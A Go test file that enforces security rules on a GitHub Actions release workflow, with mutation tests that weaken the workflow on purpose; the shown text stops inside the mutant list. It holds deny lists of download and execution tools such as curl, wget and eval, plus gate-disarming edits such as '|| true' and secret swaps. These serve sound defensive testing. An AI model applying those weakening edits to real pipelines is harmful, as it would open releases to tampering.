package releaseworkflow

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"regexp"
	"sort"
	"strings"
	"testing"

	"go.yaml.in/yaml/v3"
)

type workflow struct {
	On          map[string]any `yaml:"on"`
	Permissions map[string]string
	Concurrency map[string]any
	Env         map[string]any
	Jobs        map[string]job
}

type job struct {
	Name            string
	RunsOn          string `yaml:"runs-on"`
	TimeoutMinutes  int    `yaml:"timeout-minutes"`
	Needs           any
	If              any `yaml:"if"`
	ContinueOnError any `yaml:"continue-on-error"`
	Permissions     map[string]string
	Environment     any
	Strategy        struct {
		FailFast *bool `yaml:"fail-fast"`
		Matrix   struct {
			Include []map[string]string
		}
	}
	Outputs map[string]string
	Env     map[string]any
	Steps   []step
}

type step struct {
	ID              string
	Name            string
	Uses            string
	Shell           string
	Run             string
	With            map[string]any
	Env             map[string]any
	If              any `yaml:"if"`
	ContinueOnError any `yaml:"continue-on-error"`
}

// The action pins are the ones the other workflows of this repository already use.
const (
	checkoutPin = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
	setupGoPin  = "actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e"
	uploadPin   = "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9"
	downloadPin = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c"
	dryGuard    = "steps.resolve.outputs.dry_run == 'false'"
)

var (
	allowedUses = map[string]bool{checkoutPin: true, setupGoPin: true, uploadPin: true, downloadPin: true}
	// Exact `with:` keys per action; an unexpected key (a different ref, a token, a path)
	// changes what the action does.
	allowedWith = map[string][]string{
		checkoutPin: {"fetch-depth", "persist-credentials"},
		setupGoPin:  {"cache", "check-latest", "go-version-file"},
		uploadPin:   {"if-no-files-found", "name", "path", "retention-days"},
		downloadPin: {"merge-multiple", "name", "path", "pattern"},
	}
	swallowRe = regexp.MustCompile(`\|\|\s*(true|:)(\s|;|$)`)
	assertRe  = regexp.MustCompile(`^test .* \|\| \{ echo .* >&2; exit 1; \}$`)
	disarmRe  = regexp.MustCompile(`exit 0|set \+e|\|\| echo|\|\| exit`)
	builtinRe = regexp.MustCompile(`(^|[;&|(]\\s*)(declare|typeset|local|read) `)
	pinRe     = regexp.MustCompile(`^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+@[0-9a-f]{40}$`)
	reassign  = regexp.MustCompile(`(?m)^\s*(ACTOR|OWNER|PUSHER|COMMIT|TAG|REPO|VERSION|GH_TOKEN|GITHUB_SHA)=`)
	platforms = []string{"darwin/arm64", "linux/amd64", "linux/arm64"}
)

func readWorkflow(t *testing.T) string {
	t.Helper()
	raw, err := os.ReadFile(filepath.Join(repoRoot(t), ".github", "workflows", "release.yml"))
	if err != nil {
		t.Fatal(err)
	}
	return string(raw)
}

func parse(t *testing.T, raw string) workflow {
	t.Helper()
	var w workflow
	if err := yaml.Unmarshal([]byte(raw), &w); err != nil {
		t.Fatalf("workflow does not parse: %v", err)
	}
	return w
}

func targets(j job) []string {
	var out []string
	for _, m := range j.Strategy.Matrix.Include {
		out = append(out, m["os"]+"/"+m["arch"])
	}
	sort.Strings(out)
	return out
}

func stepNamed(j job, prefix string) (step, bool) {
	for _, s := range j.Steps {
		if strings.HasPrefix(s.Name, prefix) {
			return s, true
		}
	}
	return step{}, false
}

func isFalse(v any) bool {
	s := strings.TrimSpace(fmt.Sprint(v))
	return s == "false" || s == "${{ false }}"
}

func keys(m map[string]any) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

// violations lists every rule of docs/design/bdock-release-workflow/spec.md that w breaks.
// Each entry starts with a stable code so the mutation tests can name what they expect.
func violations(w workflow, raw string) []string {
	var v []string
	add := func(code, format string, a ...any) { v = append(v, code+": "+fmt.Sprintf(format, a...)) }

	if len(w.On) != 2 {
		add("trigger", "want exactly push and workflow_dispatch, got %v", w.On)
	}
	push, _ := w.On["push"].(map[string]any)
	if !reflect.DeepEqual(push, map[string]any{"tags": []any{"bdock/v[0-9]+.[0-9]+.[0-9]+"}}) {
		add("trigger", "push must be exactly the strict bdock/ tag pattern, got %v", push)
	}
	disp, _ := w.On["workflow_dispatch"].(map[string]any)
	in, _ := disp["inputs"].(map[string]any)
	ver, _ := in["version"].(map[string]any)
	if len(in) != 1 || ver["default"] != "0.0.0-dryrun" || ver["type"] != "string" {
		add("trigger", "workflow_dispatch must take only the dry-run version input, got %v", disp)
	}
	if !reflect.DeepEqual(w.Permissions, map[string]string{"contents": "read"}) {
		add("permissions", "top level must be contents: read, got %v", w.Permissions)
	}
	if w.Concurrency["group"] != "release-${{ github.ref }}" || w.Concurrency["cancel-in-progress"] != false {
		add("concurrency", "want a per-ref group and cancel-in-progress: false, got %v", w.Concurrency)
	}
	if len(w.Env) != 0 {
		add("env", "no workflow-level env, got %v", w.Env)
	}
	if strings.Contains(raw, "secrets.") {
		add("secrets", "the workflow must not use secrets")
	}
	if strings.Count(raw, "GH_TOKEN: ${{ github.token }}") != strings.Count(raw, "GH_TOKEN:") {
		add("secrets", "GH_TOKEN must be github.token")
	}

	var gotJobs []string
	for name := range w.Jobs {
		gotJobs = append(gotJobs, name)
	}
	sort.Strings(gotJobs)
	if !reflect.DeepEqual(gotJobs, []string{"build", "publish", "smoke", "verify"}) {
		add("jobs", "want jobs build publish smoke verify, got %v", gotJobs)
	}

	wantPerms := map[string]map[string]string{
		"verify":  {"contents": "read", "actions": "read"},
		"build":   {"contents": "read"},
		"smoke":   {"contents": "read"},
		"publish": {"contents": "write"},
	}
	for name, j := range w.Jobs {
		if !reflect.DeepEqual(j.Permissions, wantPerms[name]) {
			add("permissions", "job %s permissions = %v, want %v", name, j.Permissions, wantPerms[name])
		}
		if j.TimeoutMinutes <= 0 || j.TimeoutMinutes > 30 {
			add("timeout", "job %s needs a timeout of 1..30 minutes, got %d", name, j.TimeoutMinutes)
		}
		if j.ContinueOnError != nil {
			add("continue-on-error", "job %s sets continue-on-error", name)
		}
		if j.Env != nil {
			add("env", "job %s sets job-level env", name)
		}
		if strings.HasSuffix(j.RunsOn, "-latest") {
			add("runner", "job %s uses a floating runner image %s", name, j.RunsOn)
		}
		if name != "publish" && j.Environment != nil {
			add("environment", "only publish may use an environment, job %s does", name)
		}
		if isFalse(j.If) {
			add("if-false", "job %s is disabled with if: false", name)
		}
		for _, s := range j.Steps {
			label := s.Name + s.Run
			if s.ContinueOnError != nil {
				add("continue-on-error", "job %s step %q sets continue-on-error", name, label)
			}
			if isFalse(s.If) {
				add("if-false", "job %s step %q is disabled", name, label)
			}
			if s.Uses != "" {
				if !pinRe.MatchString(s.Uses) {
					add("pin", "job %s uses an unpinned action %s", name, s.Uses)
				}
				if !allowedUses[s.Uses] {
					add("pin", "job %s uses an action outside the allowed list: %s", name, s.Uses)
				}
				got := keys(s.With)
				want := allowedWith[s.Uses]
				var subset []string
				for _, k := range got {
					found := false
					for _, w := range want {
						found = found || w == k
					}
					if !found {
						subset = append(subset, k)
					}
				}
				if len(subset) > 0 {
					add("with", "job %s action %s has unexpected with keys %v", name, s.Uses, subset)
				}
				if s.Uses == checkoutPin && s.With["persist-credentials"] != false {
					add("persist-credentials", "job %s checkout must set persist-credentials: false", name)
				}
				if s.Uses == uploadPin && name != "build" {
					add("artifact", "only build may upload artifacts, job %s does", name)
				}
				if s.Uses == downloadPin && name != "smoke" && name != "publish" {
					add("artifact", "only smoke and publish may download artifacts, job %s does", name)
				}
			}
			if s.If != nil && !(name == "verify" && strings.HasPrefix(s.Name, "Require ") && !strings.HasPrefix(s.Name, "Require the repository owner")) {
				add("step-if", "job %s step %q must not be conditional (if: %v)", name, label, s.If)
			}
			if strings.Contains(s.Run, "\n") && !strings.HasPrefix(s.Run, "set -euo pipefail\n") {
				add("strict", "job %s multi-line script must start with set -euo pipefail", name)
			}
			for _, line := range strings.Split(s.Run, "\n") {
				line = strings.TrimSpace(line)
				if strings.HasPrefix(line, "test ") && strings.Contains(line, " || ") && !assertRe.MatchString(line) {
					add("swallow", "job %s assertion does not fail the step: %q", name, line)
				}
			}
			if disarmRe.MatchString(s.Run) || swallowRe.MatchString(s.Run) {
				add("swallow", "job %s script can succeed past a failure", name)
			}
			if reassign.MatchString(s.Run) {
				add("reassign", "job %s script assigns to a gate variable", name)
			}
			if strings.Contains(s.Run, "${{") {
				add("injection", "job %s interpolates an expression inside a run script; pass it through env", name)
			}
			for _, banned := range []string{"curl ", "wget ", "pip ", "npm ", "go install", "apt-get", "brew ", "eval ", "export ", "source ", "make release", "docker "} {
				if strings.Contains(s.Run, banned) {
					add("download", "job %s run script uses %q", name, strings.TrimSpace(banned))
				}
			}
			for _, url := range regexp.MustCompile(`https?://[^\s"']+`).FindAllString(s.Run, -1) {
				if !strings.HasPrefix(url, "https://github.com/$REPO") {
					add("url", "job %s script reaches %s", name, url)
				}
			}
			if s.Env["GH_TOKEN"] != nil && name != "verify" && name != "publish" {
				add("secrets", "job %s step %q receives GH_TOKEN", name, label)
			}
		}
	}

	// Gate variables are assigned once, from a command, never defaulted or redirected.
	gateAssign := regexp.MustCompile(`(?m)^\s*(n|out|existing|remote|commit|tag|dry_run|version|flags)=`)
	for jobName, j := range w.Jobs {
		for _, s := range j.Steps {
			counts := map[string]int{}
			for _, m := range gateAssign.FindAllStringSubmatch(s.Run, -1) {
				counts[m[1]]++
			}
			for name, c := range counts {
				limit := 1
				if s.ID == "resolve" && (name == "version" || name == "tag" || name == "dry_run") {
					limit = 2 // one per branch of the if/else
				}
				if c > limit {
					add("reassign", "job %s step %q assigns %s %d times", jobName, s.Name, name, c)
				}
			}
			for _, banned := range []string{":-", "update-ref", "git remote", "git config", "|| diff", "GIT_DIR", "git tag", "git branch", "git checkout", "git reset"} {
				if strings.Contains(s.Run, banned) {
					add("redirect", "job %s step %q contains %q", jobName, s.Name, banned)
				}
			}
		}
	}

	verify, build, smoke, publish := w.Jobs["verify"], w.Jobs["build"], w.Jobs["smoke"], w.Jobs["publish"]
	for _, s := range verify.Steps {
		if s.Uses == "" && strings.Contains(s.Run, "make release") {
			add("build", "verify must not build")
		}
	}
	if verify.RunsOn != "ubuntu-24.04" || build.RunsOn != "ubuntu-24.04" || publish.RunsOn != "ubuntu-24.04" {
		add("runner", "verify, build and publish run on ubuntu-24.04")
	}

	// Verify.
	if !reflect.DeepEqual(verify.Outputs, map[string]string{
		"commit": "${{ steps.resolve.outputs.commit }}", "dry_run": "${{ steps.resolve.outputs.dry_run }}",
		"tag": "${{ steps.resolve.outputs.tag }}", "version": "${{ steps.resolve.outputs.version }}"}) {
		add("outputs", "verify outputs = %v", verify.Outputs)
	}
	resolve, okResolve := stepNamed(verify, "Resolve the version")
	if !okResolve || resolve.ID != "resolve" {
		add("resolve", "verify needs the resolve step")
	}
	for _, want := range []string{
		`sh .github/scripts/release-verify.sh tag-version "$REF_NAME"`,
		`sh .github/scripts/release-verify.sh dryversion "$version"`,
		`dry_run=false`, `dry_run=true`, `commit=$GITHUB_SHA`,
	} {
		if !strings.Contains(resolve.Run, want) {
			add("resolve", "resolve step lacks %q", want)
		}
	}
	if resolve.Env["REF_NAME"] != "${{ github.ref_name }}" || resolve.Env["EVENT_NAME"] != "${{ github.event_name }}" || resolve.Env["REF_TYPE"] != "${{ github.ref_type }}" {
		add("resolve", "resolve env must pass the event and ref through env")
	}
	owner, okOwner := stepNamed(verify, "Require the repository owner")
	if !okOwner {
		add("owner", "verify lacks the owner step")
	}
	if !reflect.DeepEqual(owner.Env, map[string]any{"ACTOR": "${{ github.triggering_actor }}", "PUSHER": "${{ github.actor }}", "OWNER": "${{ github.repository_owner }}"}) {
		add("owner", "owner step env = %v", owner.Env)
	}
	for _, want := range []string{`test "$ACTOR" = "$OWNER" ||`, `test "$PUSHER" = "$OWNER" ||`} {
		if !strings.Contains(owner.Run, want) {
			add("owner", "owner step lacks %q", want)
		}
	}
	if r, o, a := indexOf(verify, "Resolve the version"), indexOf(verify, "Require the repository owner"), indexOf(verify, "Require an annotated tag"); r < 0 || o < r || a < o {
		add("order", "verify must resolve, then check the owner, then check the tag")
	}
	annotated, _ := stepNamed(verify, "Require an annotated tag")
	for _, want := range []string{
		`git fetch --force --no-tags "https://github.com/$REPO" "+refs/tags/$TAG:refs/tags/$TAG"`,
		`git fetch --force --no-tags "https://github.com/$REPO" '+refs/heads/main:refs/remotes/origin/main'`,
		`commit=$(sh .github/scripts/release-verify.sh tag "$TAG" refs/remotes/origin/main)`,
		`test "$commit" = "$GITHUB_SHA" ||`,
	} {
		if !strings.Contains(annotated.Run, want) {
			add("tag", "tag step lacks %q", want)
		}
	}
	green, _ := stepNamed(verify, "Require a green CI run")
	for _, want := range []string{`repos/$REPO/actions/workflows/ci.yml/runs?head_sha=$GITHUB_SHA&event=push&status=success`, `test "$n" -ge 1 ||`} {
		if !strings.Contains(green.Run, want) {
			add("ci", "CI step lacks %q", want)
		}
	}
	absent, _ := stepNamed(verify, "Require that no release exists")
	for _, want := range []string{`*"HTTP 404"*) echo "no release for $TAG yet" ;;`, `*) echo "cannot tell whether a release exists: $out" >&2; exit 1 ;;`, `echo "a release for $TAG already exists" >&2`} {
		if !strings.Contains(absent.Run, want) {
			add("exists", "release-exists step lacks %q", want)
		}
	}
	mono, _ := stepNamed(verify, "Require a version above every existing release")
	for _, want := range []string{
		`tags=$(git ls-remote --tags "https://github.com/$REPO" 'refs/tags/bdock/v*' | cut -f2 | sed 's|^refs/tags/||; s|\^{}$||')`,
		`releases=$(gh api "repos/$REPO/releases" --paginate --jq '.[].tag_name')`,
		`printf '%s\n%s\n' "$tags" "$releases" | sh .github/scripts/release-verify.sh monotonic "$TAG"`,
	} {
		if !strings.Contains(mono.Run, want) {
			add("monotonic", "monotonic step lacks %q", want)
		}
	}
	if mono.Env["TAG"] != "${{ steps.resolve.outputs.tag }}" || mono.Env["GH_TOKEN"] != "${{ github.token }}" || mono.Env["REPO"] != "${{ github.repository }}" {
		add("monotonic", "monotonic step env = %v", mono.Env)
	}
	if i, j := indexOf(verify, "Require a version above"), indexOf(verify, "Require that no release exists"); i < 0 || j < 0 || i < j {
		add("monotonic", "the monotonic check must follow the release-exists check")
	}
	for _, name := range []string{"Require an annotated tag", "Require a green CI run", "Require that no release exists", "Require a version above every existing release"} {
		s, ok := stepNamed(verify, name)
		if !ok || s.If != "steps.resolve.outputs.dry_run == 'false'" {
			add("guard", "step %q must be guarded by %s", name, dryGuard)
		}
	}
	if s, ok := stepNamed(verify, "Require an annotated tag"); ok && s.Env["TAG"] != "${{ steps.resolve.outputs.tag }}" {
		add("guard", "the tag step must check the resolved tag")
	}
	gates := ""
	for _, s := range verify.Steps {
		gates += s.Run + "\n"
	}
	for _, want := range []string{"make check", "go mod verify"} {
		if !strings.Contains(gates, want) {
			add("verify", "verify must run %s", want)
		}
	}

	// Build.
	if !reflect.DeepEqual(targets(build), platforms) {
		add("matrix", "build targets = %v, want %v", targets(build), platforms)
	}
	if !reflect.DeepEqual(build.Needs, "verify") || build.Strategy.FailFast == nil || *build.Strategy.FailFast {
		add("needs", "build needs verify and must not fail fast")
	}
	bs, _ := stepNamed(build, "Build bdock twice and compare")
	for _, want := range []string{
		`test "$(git rev-parse HEAD)" = "$COMMIT" ||`,
		`TARGETS="$OS/$ARCH" RELEASE_DIR="$RUNNER_TEMP/first" sh scripts/release.sh`,
		`GOCACHE="$RUNNER_TEMP/gocache-second" TARGETS="$OS/$ARCH" RELEASE_DIR="$RUNNER_TEMP/second" sh scripts/release.sh`,
		`diff -r "$RUNNER_TEMP/first" "$RUNNER_TEMP/second"`,
		`grep -Fx "source_revision=$COMMIT" "$RUNNER_TEMP/first/PROVENANCE"`,
		`grep -Fx "source_modified=false" "$RUNNER_TEMP/first/PROVENANCE"`,
	} {
		if !strings.Contains(bs.Run, want) {
			add("build", "build step lacks %q", want)
		}
	}
	if bs.Env["CGO_ENABLED"] != "0" || bs.Env["GOTOOLCHAIN"] != "local" ||
		bs.Env["VERSION"] != "${{ needs.verify.outputs.version }}" || bs.Env["COMMIT"] != "${{ needs.verify.outputs.commit }}" ||
		bs.Env["OS"] != "${{ matrix.os }}" || bs.Env["ARCH"] != "${{ matrix.arch }}" {
		add("build", "build env = %v", bs.Env)
	}
	// The first build must not warm the second: nothing but a comment between them.
	if first, second := strings.Index(bs.Run, "sh scripts/release.sh"), strings.LastIndex(bs.Run, "GOCACHE="); first >= 0 && second > first {
		between := strings.TrimSpace(bs.Run[first+len("sh scripts/release.sh") : second])
		if strings.Contains(between, "cp ") || strings.Contains(between, "mv ") || strings.Contains(between, "rm ") {
			add("build", "no cp, mv or rm between the two builds")
		}
	}
	up := 0
	for _, s := range build.Steps {
		if s.Uses == uploadPin {
			up++
			if s.With["name"] != "release-${{ matrix.os }}-${{ matrix.arch }}" || s.With["if-no-files-found"] != "error" || s.With["retention-days"] != 1 {
				add("artifact", "upload with = %v", s.With)
			}
		}
	}
	if up != 1 {
		add("artifact", "build uploads exactly one artifact, got %d", up)
	}

	// Smoke.
	if !reflect.DeepEqual(targets(smoke), platforms) || !reflect.DeepEqual(smoke.Needs, []any{"verify", "build"}) {
		add("matrix", "smoke must cover %v and need verify and build", platforms)
	}
	wantRunners := map[string]string{"linux/amd64": "ubuntu-24.04", "linux/arm64": "ubuntu-24.04-arm", "darwin/arm64": "macos-15"}
	for _, m := range smoke.Strategy.Matrix.Include {
		if wantRunners[m["os"]+"/"+m["arch"]] != m["runner"] {
			add("runner", "smoke %s/%s must run natively on %s, got %s", m["os"], m["arch"], wantRunners[m["os"]+"/"+m["arch"]], m["runner"])
		}
	}
	if smoke.RunsOn != "${{ matrix.runner }}" || smoke.Strategy.FailFast == nil || *smoke.Strategy.FailFast {
		add("runner", "smoke runs on matrix.runner and must not fail fast")
	}
	ss, _ := stepNamed(smoke, "Smoke-test the shipped archive")
	for _, want := range []string{
		`test "$(git rev-parse HEAD)" = "$COMMIT" ||`,
		`sh .github/scripts/release-smoke.sh "$VERSION" "$COMMIT" "$OS" "$ARCH" "$RUNNER_TEMP/dist/bdock_${VERSION}_${OS}_${ARCH}.tar.gz"`,
	} {
		if !strings.Contains(ss.Run, want) {
			add("smoke", "smoke step lacks %q", want)
		}
	}
	for _, s := range smoke.Steps {
		if s.Uses == downloadPin && s.With["name"] != "release-${{ matrix.os }}-${{ matrix.arch }}" {
			add("smoke", "smoke downloads %v", s.With["name"])
		}
	}

	// Publish.
	if !reflect.DeepEqual(publish.Needs, []any{"verify", "build", "smoke"}) {
		add("needs", "publish needs verify, build and smoke, got %v", publish.Needs)
	}
	if publish.If != "needs.verify.outputs.dry_run == 'false' && github.event_name == 'push' && github.ref_type == 'tag'" {
		add("publish-if", "publish condition = %v", publish.If)
	}
	if publish.Environment != "release" {
		add("environment", "publish uses environment release, got %v", publish.Environment)
	}
	ps, _ := stepNamed(publish, "Create the release")
	for _, want := range []string{
		`test "$ACTOR" = "$OWNER" ||`, `test "$PUSHER" = "$OWNER" ||`,
		`existing=$(gh api "repos/$REPO/releases" --paginate --jq ".[] | select(.tag_name == \"$TAG\") | .id")`,
		`test -z "$existing" ||`,
		`remote=$(git ls-remote "https://github.com/$REPO" "refs/tags/$TAG^{}" | cut -f1)`,
		`test "$remote" = "$COMMIT" ||`,
		`test "$(git rev-parse HEAD)" = "$COMMIT"`,
		`test "$(ls -1 -- bdock_*.tar.gz | wc -l)" -eq 3 ||`,
		`for platform in darwin_arm64 linux_amd64 linux_arm64; do`,
		`test -f "bdock_${VERSION}_${platform}.tar.gz" ||`,
		`test -z "$DRAFT" -o "$DRAFT" = true -o "$DRAFT" = false ||`,
		`cat -- bdock_*.tar.gz.sha256 | LC_ALL=C sort -k2 > SHA256SUMS`,
		`test "$(wc -l < SHA256SUMS)" -eq 3 ||`,
		`sha256sum --check SHA256SUMS`,
		`sh .github/scripts/release-notes.sh "$TAG" "$COMMIT" "$(cat .go-version)"`,
		`gh release create "$TAG" --repo "$REPO" --verify-tag --title "bdock v$VERSION" --notes-file "$RUNNER_TEMP/notes.md"`,
		`"$RUNNER_TEMP"/dist/bdock_*.tar.gz "$RUNNER_TEMP/dist/SHA256SUMS"`,
	} {
		if !strings.Contains(ps.Run, want) {
			add("publish", "publish step lacks %q", want)
		}
	}
	if !reflect.DeepEqual(ps.Env, map[string]any{
		"GH_TOKEN": "${{ github.token }}", "REPO": "${{ github.repository }}", "TAG": "${{ needs.verify.outputs.tag }}",
		"VERSION": "${{ needs.verify.outputs.version }}", "COMMIT": "${{ needs.verify.outputs.commit }}",
		"DRAFT": "${{ vars.BDOCK_RELEASE_DRAFT }}", "ACTOR": "${{ github.triggering_actor }}",
		"PUSHER": "${{ github.actor }}", "OWNER": "${{ github.repository_owner }}"}) {
		add("publish", "publish env = %v", ps.Env)
	}
	for _, s := range publish.Steps {
		if s.Uses == checkoutPin && s.With["fetch-depth"] != 0 {
			add("publish", "publish checkout needs full history for the notes")
		}
	}

	ifOK := []string{`if [ "$EVENT_NAME" = push ] && [ "$REF_TYPE" = tag ]; then`, `if out=$(gh api "repos/$REPO/releases/tags/$TAG" 2>&1); then`, `if [ "$DRAFT" = true ]; then flags+=(--draft); fi`}
	for jobName, j := range w.Jobs {
		for _, s := range j.Steps {
			if s.Uses == setupGoPin && (s.With["go-version-file"] != ".go-version" || s.With["check-latest"] != false) {
				add("setupgo", "job %s setup-go must use go-version-file: .go-version and check-latest: false, got %v", jobName, s.With)
			}
			for _, line := range strings.Split(s.Run, "\n") {
				line = strings.TrimSpace(line)
				if strings.HasPrefix(line, "if ") {
					ok := false
					for _, want := range ifOK {
						ok = ok || line == want
					}
					if !ok {
						add("if-line", "job %s step %q has an unexpected conditional %q", jobName, s.Name, line)
					}
				}
				if builtinRe.MatchString(line) || strings.Contains(line, "printf -v") {
					add("redirect", "job %s step %q assigns through a shell builtin: %q", jobName, s.Name, line)
				}
				if strings.Contains(line, " -o ") && !strings.HasPrefix(line, `test -z "$DRAFT" -o "$DRAFT" = true -o "$DRAFT" = false ||`) {
					add("swallow", "job %s step %q combines tests with -o: %q", jobName, s.Name, line)
				}
			}
		}
	}
	if strings.Count(gatesText(verify), "git fetch") != 2 {
		add("redirect", "verify fetches exactly the tag and main")
	}
	for _, name := range []string{"make check", "go mod verify"} {
		found := false
		for _, s := range verify.Steps {
			found = found || (s.Uses == "" && s.Run == name && s.If == nil)
		}
		if !found {
			add("verify", "verify must have a step that runs exactly %q", name)
		}
	}
	if first, diff := strings.LastIndex(bs.Run, "sh scripts/release.sh"), strings.Index(bs.Run, "diff -r"); first >= 0 && diff > first {
		rest := bs.Run[first+len("sh scripts/release.sh") : diff]
		if strings.TrimSpace(rest) != "" {
			add("build", "nothing may run between the second build and the comparison")
		}
	}
	if !strings.Contains(ps.Run, `if [ "$DRAFT" = true ]; then flags+=(--draft); fi`) {
		add("publish", "publish lacks the draft rule")
	}
	if !strings.Contains(green.Run, `n=$(gh api "repos/$REPO/actions/workflows/ci.yml/runs?head_sha=$GITHUB_SHA&event=push&status=success" --jq '.workflow_runs | map(select(.conclusion == "success")) | length')`) {
		add("ci", "CI step lacks the exact count query")
	}
	return v
}

func indexOf(j job, prefix string) int {
	for i, s := range j.Steps {
		if strings.HasPrefix(s.Name, prefix) {
			return i
		}
	}
	return -1
}

func TestReleaseWorkflowFollowsTheRules(t *testing.T) {
	raw := readWorkflow(t)
	if got := violations(parse(t, raw), raw); len(got) > 0 {
		t.Fatalf("release.yml breaks %d rules:\n%s", len(got), strings.Join(got, "\n"))
	}
}

func TestReleaseWorkflowRunBlocksParse(t *testing.T) {
	raw := readWorkflow(t)
	for name, j := range parse(t, raw).Jobs {
		for _, s := range j.Steps {
			if s.Run == "" {
				continue
			}
			dir := t.TempDir()
			path := filepath.Join(dir, "step.sh")
			if err := os.WriteFile(path, []byte(s.Run), 0o644); err != nil {
				t.Fatal(err)
			}
			shell := "sh"
			if s.Shell == "bash" {
				shell = "bash"
			}
			if out, err := runIn(t, dir, nil, shell, "-n", path); err != nil {
				t.Errorf("job %s step %q does not parse: %s", name, s.Name, out)
			}
		}
	}
}

// Each mutant weakens the real file once; the rules must name the expected code.
func TestReleaseWorkflowMutantsAreCaught(t *testing.T) {
	raw := readWorkflow(t)
	type mutant struct{ name, code, from, to string }
	mutants := []mutant{
		{"widen the tag pattern", "trigger", "'bdock/v[0-9]+.[0-9]+.[0-9]+'", "'bdock/v*'"},
		{"match image tags", "trigger", "'bdock/v[0-9]+.[0-9]+.[0-9]+'", "'v[0-9]+.[0-9]+.[0-9]+'"},
		{"pre-release pattern", "trigger", "'bdock/v[0-9]+.[0-9]+.[0-9]+'", "'bdock/v[0-9]+.[0-9]+.[0-9]+*'"},
		{"branch push trigger", "trigger", "on:\n  push:", "on:\n  pull_request:\n  push:"},
		{"dispatch default label", "trigger", "default: 0.0.0-dryrun", "default: 0.1.0"},
		{"top-level write", "permissions", "permissions:\n  contents: read\n\nconcurrency", "permissions:\n  contents: write\n\nconcurrency"},
		{"cancel in progress", "concurrency", "cancel-in-progress: false", "cancel-in-progress: true"},
		{"secret", "secrets", "GH_TOKEN: ${{ github.token }}\n          REPO: ${{ github.repository }}\n          TAG: ${{ needs.verify.outputs.tag }}\n          VERSION", "GH_TOKEN: ${{ secrets.PAT }}\n          REPO: ${{ github.repository }}\n          TAG: ${{ needs.verify.outputs.tag }}\n          VERSION"},
		{"unpinned checkout", "pin", checkoutPin, "actions/checkout@v7"},
		{"foreign action", "pin", setupGoPin, "actions/setup-node@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e"},
		{"persist credentials", "persist-credentials", "persist-credentials: false", "persist-credentials: true"},
		{"extra with key", "with", "go-version-file: .go-version", "go-version-file: .go-version\n          token: x"},
		{"drop timeout", "timeout", "    timeout-minutes: 20\n", ""},
		{"floating runner", "runner", "runs-on: ubuntu-24.04\n    timeout-minutes: 20", "runs-on: ubuntu-latest\n    timeout-minutes: 20"},
		{"verify gate continue-on-error", "continue-on-error", "      - run: make check", "      - continue-on-error: true\n        run: make check"},
		{"disable the owner check", "if-false", "      - name: Require the repository owner to have started the run", "      - if: false\n        name: Require the repository owner to have started the run"},
		{"conditional owner check", "step-if", "      - name: Require the repository owner to have started the run", "      - if: github.event_name == 'push'\n        name: Require the repository owner to have started the run"},
		{"owner env always equal", "owner", "ACTOR: ${{ github.triggering_actor }}\n          PUSHER", "ACTOR: ${{ github.repository_owner }}\n          PUSHER"},
		{"drop the pusher check", "owner", `          test "$PUSHER" = "$OWNER" || { echo "run originally started by $PUSHER, not by the repository owner $OWNER" >&2; exit 1; }`, "          true"},
		{"swallow the tag check", "swallow", `test "$commit" = "$GITHUB_SHA" || { echo "tag $TAG names $commit but the run is for $GITHUB_SHA" >&2; exit 1; }`, `test "$commit" = "$GITHUB_SHA" || true`},
		{"disarm with exit 0", "swallow", `test "$n" -ge 1 || { echo "no successful CI run on push for $GITHUB_SHA; wait for or re-run CI for that commit first" >&2; exit 1; }`, `test "$n" -ge 1 || { echo "x" >&2; exit 0; }`},
		{"set +e", "strict", "          set -euo pipefail\n          if [ \"$EVENT_NAME\"", "          set +e\n          if [ \"$EVENT_NAME\""},
		{"annotated tag check removed", "tag", `commit=$(sh .github/scripts/release-verify.sh tag "$TAG" refs/remotes/origin/main)`, `commit=$GITHUB_SHA`},
		{"tag fetch not forced", "tag", `git fetch --force --no-tags "https://github.com/$REPO" "+refs/tags/$TAG:refs/tags/$TAG"`, `git fetch --no-tags "https://github.com/$REPO" "+refs/tags/$TAG:refs/tags/$TAG"`},
		{"CI query by event", "ci", "event=push&status=success", "status=success"},
		{"CI threshold", "ci", `test "$n" -ge 1`, `test "$n" -ge 0`},
		{"release-exists loosened", "exists", `*) echo "cannot tell whether a release exists: $out" >&2; exit 1 ;;`, `*) echo "ignored" ;;`},
		{"tag step unguarded", "guard", "      - name: Require an annotated tag on a commit of main\n        if: steps.resolve.outputs.dry_run == 'false'\n", "      - name: Require an annotated tag on a commit of main\n"},
		{"drop make check", "verify", "      - run: make check\n", ""},
		{"drop go mod verify", "verify", "      - run: go mod verify\n", ""},
		{"lose a platform", "matrix", "          - os: darwin\n            arch: arm64\n    steps:", "    steps:"},
		{"smoke on wrong runner", "runner", "runner: macos-15", "runner: ubuntu-24.04"},
		{"smoke arm64 emulated", "runner", "runner: ubuntu-24.04-arm", "runner: ubuntu-24.04"},
		{"copy between builds", "build", "          # A second build with an empty build cache", "          cp -r \"$RUNNER_TEMP/first\" \"$RUNNER_TEMP/second\"\n          # A second build with an empty build cache"},
		{"n overwritten", "reassign", "          test \"$n\" -ge 1 ||", "          n=1\n          test \"$n\" -ge 1 ||"},
		{"existing cleared", "reassign", "          test -z \"$existing\" ||", "          existing=\"\"\n          test -z \"$existing\" ||"},
		{"remote defaulted", "redirect", "          test \"$remote\" = \"$COMMIT\" ||", "          remote=${remote:-$COMMIT}\n          test \"$remote\" = \"$COMMIT\" ||"},
		{"main redirected", "redirect", "          commit=$(sh .github/scripts/release-verify.sh tag", "          git update-ref refs/remotes/origin/main HEAD\n          commit=$(sh .github/scripts/release-verify.sh tag"},
		{"build fail-fast default", "needs", "  build:\n    name: build (${{ matrix.os }}/${{ matrix.arch }})\n    needs: verify\n    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n    permissions:\n      contents: read\n    strategy:\n      fail-fast: false\n", "  build:\n    name: build (${{ matrix.os }}/${{ matrix.arch }})\n    needs: verify\n    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n    permissions:\n      contents: read\n    strategy:\n"},
		{"archive names unchecked", "publish", "            test -f \"bdock_${VERSION}_${platform}.tar.gz\" ||", "            test -n \"$platform\" ||"},
